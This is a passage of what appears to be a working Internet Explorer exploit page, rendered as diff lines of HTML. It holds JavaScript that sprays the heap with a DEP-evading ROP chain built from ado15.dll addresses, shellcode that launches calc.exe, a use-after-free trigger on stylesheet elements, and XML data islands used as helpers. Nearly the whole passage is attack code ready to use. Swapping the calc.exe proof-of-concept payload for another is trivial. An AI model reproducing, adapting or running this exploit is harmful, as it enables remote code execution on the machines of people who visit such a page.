+<P>&nbsp;&nbsp; </P>
+<P>function FaseTwo() {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; document.getElementById('textfasetwo').innerText = 'Setting up heap for DEP evasion:';&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; document.getElementById('progressfasetwo').innerText = '0%';&nbsp; </P>
+<P>&nbsp; heap = new heapLib.ie(0x20000);&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; var heapspray = unescape("%u2020%u1604%u0102%u0103%u0104%u0105" + MakeAddressString(adobase + 0x117C3) + MakeAddressString(adobase + 0x1188 - 0x1C) + "%u010A%u010B" + MakeAddressString(adobase + 0x4270B) + "%u010E%u010F%u0110%u0111%u0112%u0113" + "%u2100%u1604" + "%u0116%u0117%u0118%u0119%u011A%u011B%u011C%u011D%u011E%u011F%u0120%u0121%u0122%u0123" + MakeAddressString(adobase)&nbsp; + "%u0126%u0127%u0128%u0129%u012A%u012B" + "%u2024%u1604" + "%u012E%u012F%u0130%u0131%u0132%u0133" + "%u0040%u0000" + "%u0136%u0137" + MakeAddressString(adobase + 0x1B1F0)&nbsp; + "%u013A%u013B" + "%u0200%u0000" + "%u013E%u013F" + "%u2030%u1604" + "%u0142%u0143%u0144%u0145%u0146%u0147%u0148%u0149%u014A%u014B%u014C%u014D%u014E%u014F%u0150%u0151%u0152%u0153%u0154%u0155%u0156%u0157%u0158%u0159%u015A%u015B%u015C%u015D%u015E%u015F%u0160%u0161%u0162%u0163%u0164%u0165%u0166%u0167%u0168%u0169%u016A%u016B%u016C%u016D%u016E%u016F" +&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "%u9090%u9090%u868B%u1108%u0000%u5056%u056A%uA068%u0421%u0516%u185E%u0008%uD0FF%u5058%u0590%u0BBB%u0000%uD0FF%uF88B%u0558%u3B47%u0000%u006A%uFF57%uCCD0" + "%u0189%u018A%u018B%u018C%u018D%u018E%u018F%u0190%u0191%u0192%u0193%u0194%u0195%u0196%u0197%u0198%u0199%u019A%u019B%u019C%u019D%u019E%u019F%u01A0%u01A1%u01A2%u01A3%u01A4%u01A5%u01A6%u01A7%u01A8%u01A9%u01AA%u01AB%u01AC%u01AD%u01AE%u01AF%u01B0%u01B1%u01B2%u01B3%u01B4%u01B5%u01B6%u01B7%u01B8%u01B9%u01BA%u01BB%u01BC%u01BD%u01BE%u01BF" +&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "%u6163%u636C%u652E%u6578%u0000%u735C%u7379%u6574%u336D%u5C32%u6163%u636C%u652E%u6578%u0000%u0000" + "%u01D0%u01D1%u01D2%u01D3%u01D4%u01D5%u01D6%u01D7%u01D8%u01D9%u01DA%u01DB%u01DC%u01DD%u01DE%u01DF%u01E0%u01E1%u01E2%u01E3%u01E4%u01E5%u01E6%u01E7%u01E8%u01E9%u01EA%u01EB%u01EC%u01ED%u01EE%u01EF" + "%u20A0%u1604" + "%u01F2%u01F3%u01F4%u01F5%u01F6%u01F7%u01F8%u01F9%u01FA%u01FB%u01FC%u01FD%u01FE%u01FF%u0200%u0201%u0202%u0203%u0204%u0205%u0206%u0207%u0208%u0209%u020A%u020B%u020C%u020D%u020E%u020F%u0210%u0211%u0212%u0213%u0214%u0215%u0216%u0217%u0218%u0219%u021A%u021B%u021C%u021D%u021E%u021F%u0220%u0221%u0222%u0223%u0224%u0225%u0226%u0227%u0228%u0229%u022A%u022B%u022C%u022D%u022E%u022F%u0230%u0231%u0232%u0233%u0234%u0235%u0236%u0237%u0238%u0239%u023A%u023B%u023C%u023D%u023E%u023F%u0240%u0241%u0242%u0243%u0244%u0245%u0246%u0247%u0248%u0249%u024A%u024B%u024C%u024D%u024E%u024F%u0250%u0251%u0252%u0253%u0254%u0255%u0256%u0257%u0258%u0259%u025A%u025B%u025C%u025D%u025E%u025F%u0260%u0261%u0262%u0263%u0264%u0265%u0266%u0267%u0268%u0269%u026A%u026B%u026C%u026D%u026E%u026F%u0270%u0271%u0272%u0273%u0274%u0275%u0276%u0277%u0278%u0279%u027A%u027B%u027C%u027D%u027E%u027F%u0280%u0281%u0282%u0283%u0284%u0285%u0286%u0287%u0288%u0289%u028A%u028B%u028C%u028D%u028E%u028F%u0290%u0291%u0292%u0293%u0294%u0295%u0296%u0297%u0298%u0299%u029A%u029B%u029C%u029D%u029E%u029F%u02A0%u02A1%u02A2%u02A3%u02A4%u02A5%u02A6%u02A7%u02A8%u02A9%u02AA%u02AB%u02AC%u02AD%u02AE%u02AF%u02B0%u02B1%u02B2%u02B3%u02B4%u02B5%u02B6%u02B7%u02B8%u02B9%u02BA%u02BB%u02BC%u02BD%u02BE%u02BF%u02C0%u02C1%u02C2%u02C3%u02C4%u02C5%u02C6%u02C7%u02C8%u02C9%u02CA%u02CB%u02CC%u02CD%u02CE%u02CF%u02D0%u02D1%u02D2%u02D3%u02D4%u02D5%u02D6%u02D7%u02D8%u02D9%u02DA%u02DB%u02DC%u02DD%u02DE%u02DF%u02E0%u02E1%u02E2%u02E3%u02E4%u02E5%u02E6%u02E7%u02E8%u02E9%u02EA%u02EB%u02EC%u02ED%u02EE%u02EF%u02F0%u02F1%u02F2%u02F3%u02F4%u02F5%u02F6%u02F7%u02F8%u02F9%u02FA%u02FB%u02FC%u02FD%u02FE%u02FF");&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //"%u6163%u636C%u652D%u6578%u0000&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //%u3A63%u775C%u6E69%u6F64%u7377%u735C%u7379%u6574%u336D%u5C32%u6163%u636C%u652E%u6578&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //c:\windows\system32\calc.exe&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //%63%61%6C%63%2E%65%78%65&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //%63%3A%5C%77%69%6E%64%6F%77%73%5C%73%79%73%74%65%6D%33%32%5C%63%61%6C%63%2E%65%78%65&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; //var heapspray = unescape("%u2020%u1604%u0102%u0103%u0104%u0105" + MakeAddressString(adobase + 0x117C3) + MakeAddressString(adobase + 0x1188 - 0x1C) + "%u010A%u010B" + MakeAddressString(adobase + 0x4270B) + "%u010E%u010F%u0110%u0111%u0112%u0113" + "%u2100%u1604" + "%u0116%u0117%u0118%u0119%u011A%u011B%u011C%u011D%u011E%u011F%u0120%u0121%u0122%u0123%u0124%u0125%u0126%u0127%u0128%u0129%u012A%u012B" + "%u2024%u1604" + "%u012E%u012F%u0130%u0131%u0132%u0133" + "%u0040%u0000" + "%u0136%u0137" + MakeAddressString(adobase + 0x1B1F0)&nbsp; + "%u013A%u013B" + "%u0200%u0000" + "%u013E%u013F" + "%u2030%u1604" + "%u0142%u0143%u0144%u0145%u0146%u0147%u0148%u0149%u014A%u014B%u014C%u014D%u014E%u014F%u0150%u0151%u0152%u0153%u0154%u0155%u0156%u0157%u0158%u0159%u015A%u015B%u015C%u015D%u015E%u015F%u0160%u0161%u0162%u0163%u0164%u0165%u0166%u0167%u0168%u0169%u016A%u016B%u016C%u016D%u016E%u016F%u0170%u0171%u0172%u0173%u0174%u0175%u0176%u0177%u0178%u0179%u017A%u017B%u017C%u017D%u017E%u017F%u0180%u0181%u0182%u0183%u0184%u0185%u0186%u0187%u0188%u0189%u018A%u018B%u018C%u018D%u018E%u018F%u0190%u0191%u0192%u0193%u0194%u0195%u0196%u0197%u0198%u0199%u019A%u019B%u019C%u019D%u019E%u019F%u01A0%u01A1%u01A2%u01A3%u01A4%u01A5%u01A6%u01A7%u01A8%u01A9%u01AA%u01AB%u01AC%u01AD%u01AE%u01AF%u01B0%u01B1%u01B2%u01B3%u01B4%u01B5%u01B6%u01B7%u01B8%u01B9%u01BA%u01BB%u01BC%u01BD%u01BE%u01BF%u01C0%u01C1%u01C2%u01C3%u01C4%u01C5%u01C6%u01C7%u01C8%u01C9%u01CA%u01CB%u01CC%u01CD%u01CE%u01CF%u01D0%u01D1%u01D2%u01D3%u01D4%u01D5%u01D6%u01D7%u01D8%u01D9%u01DA%u01DB%u01DC%u01DD%u01DE%u01DF%u01E0%u01E1%u01E2%u01E3%u01E4%u01E5%u01E6%u01E7%u01E8%u01E9%u01EA%u01EB%u01EC%u01ED%u01EE%u01EF" + "%u20A0%u1604" + "%u01F2%u01F3%u01F4%u01F5%u01F6%u01F7%u01F8%u01F9%u01FA%u01FB%u01FC%u01FD%u01FE%u01FF%u0200%u0201%u0202%u0203%u0204%u0205%u0206%u0207%u0208%u0209%u020A%u020B%u020C%u020D%u020E%u020F%u0210%u0211%u0212%u0213%u0214%u0215%u0216%u0217%u0218%u0219%u021A%u021B%u021C%u021D%u021E%u021F%u0220%u0221%u0222%u0223%u0224%u0225%u0226%u0227%u0228%u0229%u022A%u022B%u022C%u022D%u022E%u022F%u0230%u0231%u0232%u0233%u0234%u0235%u0236%u0237%u0238%u0239%u023A%u023B%u023C%u023D%u023E%u023F%u0240%u0241%u0242%u0243%u0244%u0245%u0246%u0247%u0248%u0249%u024A%u024B%u024C%u024D%u024E%u024F%u0250%u0251%u0252%u0253%u0254%u0255%u0256%u0257%u0258%u0259%u025A%u025B%u025C%u025D%u025E%u025F%u0260%u0261%u0262%u0263%u0264%u0265%u0266%u0267%u0268%u0269%u026A%u026B%u026C%u026D%u026E%u026F%u0270%u0271%u0272%u0273%u0274%u0275%u0276%u0277%u0278%u0279%u027A%u027B%u027C%u027D%u027E%u027F%u0280%u0281%u0282%u0283%u0284%u0285%u0286%u0287%u0288%u0289%u028A%u028B%u028C%u028D%u028E%u028F%u0290%u0291%u0292%u0293%u0294%u0295%u0296%u0297%u0298%u0299%u029A%u029B%u029C%u029D%u029E%u029F%u02A0%u02A1%u02A2%u02A3%u02A4%u02A5%u02A6%u02A7%u02A8%u02A9%u02AA%u02AB%u02AC%u02AD%u02AE%u02AF%u02B0%u02B1%u02B2%u02B3%u02B4%u02B5%u02B6%u02B7%u02B8%u02B9%u02BA%u02BB%u02BC%u02BD%u02BE%u02BF%u02C0%u02C1%u02C2%u02C3%u02C4%u02C5%u02C6%u02C7%u02C8%u02C9%u02CA%u02CB%u02CC%u02CD%u02CE%u02CF%u02D0%u02D1%u02D2%u02D3%u02D4%u02D5%u02D6%u02D7%u02D8%u02D9%u02DA%u02DB%u02DC%u02DD%u02DE%u02DF%u02E0%u02E1%u02E2%u02E3%u02E4%u02E5%u02E6%u02E7%u02E8%u02E9%u02EA%u02EB%u02EC%u02ED%u02EE%u02EF%u02F0%u02F1%u02F2%u02F3%u02F4%u02F5%u02F6%u02F7%u02F8%u02F9%u02FA%u02FB%u02FC%u02FD%u02FE%u02FF");&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; while(heapspray.length &lt; 0x200) heapspray += unescape("%u4444");&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; var heapblock = heapspray;&nbsp; </P>
+<P>&nbsp; while(heapblock.length &lt; 0x40000) heapblock += heapblock;&nbsp; </P>
+<P>&nbsp; finalspray = heapblock.substring(2, 0x40000 - 0x21);&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; //alert('Base address of ado15.dll ' + adobase.toString(16));&nbsp; </P>
+<P>&nbsp; if(CurrentHeapSpraySize &lt; 900) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; window.setTimeout(SprayHeap, 100);&nbsp; </P>
+<P>&nbsp; }&nbsp; </P>
+<P>&nbsp; else {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; RunExploit();&nbsp; </P>
+<P>&nbsp; }&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function SprayHeap() {&nbsp; </P>
+<P>&nbsp; if(CurrentHeapSpraySize &lt; FinalHeapSpraySize - 1) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; for(var i = 0; i &lt; 90; i++) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; heap.alloc(finalspray);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CurrentHeapSpraySize++;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; var percentcomplete = Math.round(CurrentHeapSpraySize /FinalHeapSpraySize * 100);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; document.getElementById('progressfasetwo').innerText = percentcomplete + "%";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; window.setTimeout(SprayHeap, 100);&nbsp; </P>
+<P>&nbsp; }&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; else {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('textfasetwodone').innerText = "Ready to start calc.exe in: ";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(RunExploitTimer, 100);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function RunExploitTimer() {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; if(ExpoitTime &gt; 0) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('countexploitrun').innerText = ExpoitTime;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(RunExploitTimer, 500);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExpoitTime--;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; else {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('countexploitrun').innerText = 0;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var EndTime = new Date();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var TotalRun = Math.round((EndTime.getTime() - StartTime.getTime()) / 1000);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('totalruntime').innerText = "Total exploitation time: " + TotalRun + " seconds";&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.setTimeout(RunExploit, 100);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>function RunExploit() {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; var elms = new Array();&nbsp; </P>
+<P>&nbsp; for(i =0; i &lt; 100; i++) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elms.push(document.createElement('div'));&nbsp; </P>
+<P>&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; owningObj = document.styleSheets[0].owningElement;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; myimports = document.styleSheets[0].imports;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; document.appendChild(owningObj);&nbsp; </P>
+<P>&nbsp; document.removeChild(owningObj);&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; owningObj.outerHTML = 'a';&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; Math.atan2(0xbabe, "Collect");&nbsp; </P>
+<P>&nbsp; CollectGarbage();&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; Math.atan2(0xbabe, "spray");&nbsp; </P>
+<P>&nbsp; for(i = 0; i &lt; 100; i++) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; elms[i].className = unescape("%u4140%u4141%u4142%u4143%u4144%u4145%u4146%u4147%u4148%u4149%u414a%u414b%u414c%u414d%u414e%u414f%u4151%u4152%u4153%u4154%u2020%u1604%u2020%u1604%u4159%u415a%u415b");&nbsp; </P>
+<P>&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; Result = owningObj.insertAdjacentElement(myimports,'a');&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function MakeAddressString(addrint) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; //First, turn into hex:&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; var addstr = addrint.toString(16);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; //Split and swap&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; addstr = addstr.replace(/(\w\w\w\w)(\w\w\w\w)/,"%u$2%u$1");&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; return addstr;&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;/script&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; &lt;/head&gt;&nbsp; </P>
+<P>&nbsp; &lt;body onLoad="window.setTimeout(Start,100);" id="bodyid"&gt;&nbsp; </P>
+<P>&nbsp; &lt;div&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="textfaseone"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="progressfaseone"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="textfaseonedone"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="textfoundaddress"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="textfasetwo"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="progressfasetwo"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="textfasetwodone"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="countexploitrun"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;br&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;h2 id="totalruntime"&gt;&lt;/h2&gt;&nbsp; </P>
+<P>&nbsp; &lt;/div&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;&nbsp; </P>
+<P>&lt;XML ID="xmlid1"&gt;&nbsp; </P>
+<P>&lt;Devices&gt;&nbsp; </P>
+<P>&lt;Device&gt;&nbsp; </P>
+<P>&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /&gt;&nbsp; </P>
+<P>&lt;/Device&gt;&nbsp; </P>
+<P>&lt;/Devices&gt;&nbsp; </P>
+<P>&lt;/XML&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;&nbsp; </P>
+<P>&lt;XML ID="xmlid2"&gt;&nbsp; </P>
+<P>&lt;Devices&gt;&nbsp; </P>
+<P>&lt;Device&gt;&nbsp; </P>
+<P>&lt;BBBB /&gt;&nbsp; </P>
+<P>&lt;/Device&gt;&nbsp; </P>
+<P>&lt;/Devices&gt;&nbsp; </P>
+<P>&lt;/XML&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;&nbsp; </P>
+<P>&lt;XML ID="xmlid3"&gt;&nbsp; </P>
+<P>&lt;root&gt;&nbsp; </P>
+<P>&lt;data&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;SmallData&gt;&nbsp; </P>
+<P>&nbsp; &lt;/SmallData&gt;&nbsp; </P>
+<P>&lt;MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; value1&nbsp; </P>
+<P>&lt;/MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong&gt;&nbsp; </P>
+<P>&lt;/data&gt;&nbsp; </P>
+<P>&lt;/root&gt;&nbsp; </P>
+<P>&lt;/XML&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;&nbsp; </P>
+<P>&lt;XML ID="xmlid4"&gt;&nbsp; </P>
+<P>&lt;Devices&gt;&nbsp; </P>
+<P>&lt;Device&gt;&nbsp; </P>
+<P>&lt;bb /&gt;&nbsp; </P>
+<P>&lt;/Device&gt;&nbsp; </P>
+<P>&lt;/Devices&gt;&nbsp; </P>
+<P>&lt;/XML&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;&nbsp; </P>
+<P>&lt;XML ID="xmlid5"&gt;&nbsp; </P>
+<P>&lt;Devices&gt;&nbsp; </P>
+<P>&lt;Device&gt;&nbsp; </P>
+<P>&lt;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB /&gt;&nbsp; </P>
+<P>&lt;/Device&gt;&nbsp; </P>
+<P>&lt;/Devices&gt;&nbsp; </P>
+<P>&lt;/XML&gt;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&lt;?xml version="1.0" encoding="utf-8" standalone="yes"?&gt;&nbsp; </P>
+<P>&lt;XML ID="xmlid6"&gt;&nbsp; </P>
+<P>&lt;root&gt;&nbsp; </P>
+<P>&lt;data&gt;&nbsp; </P>
